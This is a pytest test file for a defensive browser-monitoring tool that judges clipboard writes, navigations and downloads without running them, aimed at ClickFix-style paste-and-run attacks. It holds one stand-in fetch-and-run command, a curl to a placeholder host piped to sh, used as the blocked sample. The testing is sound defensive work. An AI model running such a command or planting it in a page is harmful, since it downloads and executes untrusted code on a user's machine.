"""Browser observations (v2.1, A68): judged before anything runs, never executing, never raw."""

from __future__ import annotations

import json
import threading
import urllib.error
import urllib.request
from pathlib import Path

import pytest
from tests.livehelp import make_barrier

from refmon.live import BROWSER_RATE, LiveBarrier, browser_action, make_http_server
from refmon.schemas import Decision, Mode

CLICKFIX = "curl -s http://bad-cdn.example.invalid/verify.sh | sh"  # harmless stand-in, never run
DOC_COPY = "ls -la"


@pytest.fixture
def barrier(tmp_path: Path) -> LiveBarrier:
    return make_barrier(tmp_path)


def _all_logs(b: LiveBarrier) -> str:
    return "\n".join(p.read_text(encoding="utf-8") for p in b.logs_dir.glob("*") if p.is_file())


def test_a_page_injecting_a_fetch_and_run_command_is_blocked_before_it_runs(barrier):
    marker = barrier.workspace_dir / "pwned"
    res = barrier.browser_observation(
        {"kind": "clipboard_write", "text": f"{CLICKFIX}; touch {marker}",
         "domain": "captcha-check.example.invalid", "user_selection": False}
    )  # fmt: skip
    assert res["decision"] == "block"
    assert res["action"] == "replace_clipboard"
    assert res["family"]["id"] == "clickfix"
    assert res["predicted"] is True
    assert not marker.exists()  # judged as written, never executed


def test_a_copied_local_doc_command_is_allowed_and_left_alone(barrier):
    res = barrier.browser_observation(
        {"kind": "clipboard_write", "text": DOC_COPY, "domain": "docs.example.org",
         "user_selection": True}
    )  # fmt: skip
    assert res["decision"] == "allow"
    assert res["action"] == "none"
    assert res["family"]["id"] == "none"


def test_no_raw_text_or_address_reaches_any_log_or_answer(barrier):
    secret_path = "/s3cr3t-lure-path-7781"
    res = barrier.browser_observation(
        {"kind": "clipboard_write", "text": f"{CLICKFIX} {secret_path}",
         "domain": "lure.example.invalid"}
    )  # fmt: skip
    barrier.browser_observation(
        {"kind": "navigate", "url": f"https://lure.example.invalid{secret_path}?q=1",
         "domain": "lure.example.invalid"}
    )  # fmt: skip
    logs = _all_logs(barrier) + json.dumps(res) + json.dumps(barrier.state_snapshot())
    for raw in (secret_path, "bad-cdn.example.invalid", "verify.sh", "lure.example.invalid"):
        assert raw not in logs


@pytest.mark.parametrize(
    "data",
    [
        {"kind": "run", "text": "echo"},
        {"kind": "clipboard_write", "text": "echo", "execute": True},
        {"kind": "clipboard_write", "text": "echo", "role": "web_worker"},
        {"kind": "clipboard_write", "text": "echo", "origin": "none"},
        {"kind": "clipboard_write", "text": ""},
        {"kind": "clipboard_write", "text": "x" * 20000},
        {"kind": "clipboard_write", "text": "echo", "domain": "not a host"},
        {"kind": "navigate"},
        {"kind": "navigate", "url": "u" * 5000},
    ],
)
def test_malformed_or_overreaching_observations_are_refused(barrier, data):
    with pytest.raises(ValueError):
        barrier.browser_observation(data)


def test_a_known_bad_page_is_held_not_blocked_without_a_contract_signal(barrier):
    # threat-list hit + origin crosses the block threshold, but the contract gate caps it at hold
    res = barrier.browser_observation(
        {"kind": "navigate", "url": "https://bad.example.invalid/", "domain": "bad.example.invalid"}
    )
    assert res["decision"] == "hold"
    assert res["action"] == "confirm"
    assert res["family"]["id"] == "known_bad"
    assert res["holds"], "a hold the user can answer"
    hold = res["holds"][0]["hold_id"]
    answered = barrier.answer_browser_hold(hold, "stop")
    assert answered["state"] != "pending"
    with pytest.raises(ValueError):
        barrier.answer_browser_hold(hold, "stop")  # answered once


def test_a_normal_page_and_download_are_allowed(barrier):
    for kind in ("navigate", "download"):
        res = barrier.browser_observation(
            {"kind": kind, "url": "https://www.example.org/file.pdf", "domain": "www.example.org"}
        )
        assert res["decision"] == "allow" and res["action"] == "none"


def test_only_browser_holds_can_be_answered_by_the_extension(barrier):
    with pytest.raises(ValueError):
        barrier.answer_browser_hold("hold-00001", "continue")


def test_the_rate_limit_reports_unavailable_and_generates_no_evidence(barrier):
    count, _ = BROWSER_RATE
    stories_before = None
    for i in range(count):
        barrier.browser_observation({"kind": "navigate", "url": f"https://www.example.org/{i}"})
    stories_before = len(barrier.pipeline.linker.records)
    res = barrier.browser_observation({"kind": "navigate", "url": "https://www.example.org/x"})
    assert res == {"decision": "unavailable", "reason": "rate_limited", "action": "none"}
    assert len(barrier.pipeline.linker.records) == stories_before


def test_the_action_follows_the_mode():
    assert browser_action(Mode.OBSERVE, Decision.BLOCK, "clipboard_write") == "none"
    assert browser_action(Mode.WARN, Decision.BLOCK, "clipboard_write") == "warn"
    assert browser_action(Mode.BLOCK, Decision.HOLD, "download") == "confirm"
    assert browser_action(Mode.BLOCK, Decision.BLOCK, "download") == "cancel_download"
    assert browser_action(Mode.BLOCK, Decision.BLOCK, "navigate") == "block_page"
    assert browser_action(Mode.BLOCK, Decision.ALLOW, "navigate") == "none"


def _post(port: int, body: dict, token: str | None) -> tuple[int, dict]:
    headers = {"Content-Type": "application/json"}
    if token:
        headers["X-Refmon-Token"] = token
    req = urllib.request.Request(
        f"http://localhost:{port}/api/browser", data=json.dumps(body).encode(), headers=headers,
        method="POST",
    )  # fmt: skip
    try:
        with urllib.request.urlopen(req, timeout=5.0) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as exc:
        return exc.code, json.loads(exc.read())


def test_the_http_route_needs_the_token_and_never_executes(barrier):
    server = make_http_server(barrier, host="127.0.0.1", port=0)
    port = server.server_address[1]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    marker = barrier.workspace_dir / "pwned-http"
    try:
        body = {"kind": "clipboard_write", "text": f"touch {marker}", "domain": "x.example.org"}
        assert _post(port, body, None)[0] == 401
        status, res = _post(port, body, barrier.api_token)
        assert status == 200 and res["predicted"] is True
        status, _ = _post(port, {**body, "execute": True}, barrier.api_token)
        assert status == 400
        status, _ = _post(port, {"kind": "hold_answer", "hold_id": "nope"}, barrier.api_token)
        assert status == 400
        assert not marker.exists()
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2.0)
